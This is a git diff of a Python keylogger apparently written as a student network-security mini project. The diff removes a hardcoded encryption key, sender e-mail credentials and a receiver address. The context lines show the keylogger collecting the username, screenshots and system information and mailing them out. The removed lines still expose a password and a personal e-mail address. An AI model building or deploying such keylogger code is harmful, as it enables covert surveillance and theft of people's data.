@@ -57,7 +57,7 @@ username = getpass.getuser()
 e = str(input("Enter your E-mail ID:\n")) 
 toaddr = e # Enter the email address you want to send your information to
 
-key = "3K0jJcLznUeLRYdUF5CNLcx2MzX7jHlArMoa6CSZCMw=" # Generate an encryption key from the Cryptography folder
+key = "" # Generate an encryption key from the Cryptography folder
 
 file_path = "D:\\Notes\\5th Semester\\Network Security Mini project\\Keylogger" # Enter the file path you want your files to be saved to
 extend = "\\"
@@ -289,11 +289,11 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 #E-mail Address of sender
-email_address = "feyim44880@d3bb.com"
-password = "43572916"
+email_address = ''
+password = ''
 
 #E-mail Address of Receiver
-toaddr = "sarveshband206@gmail.com"
+toaddr = ''
 
 #Log file to be created
 system_information = "systeminfo.txt"
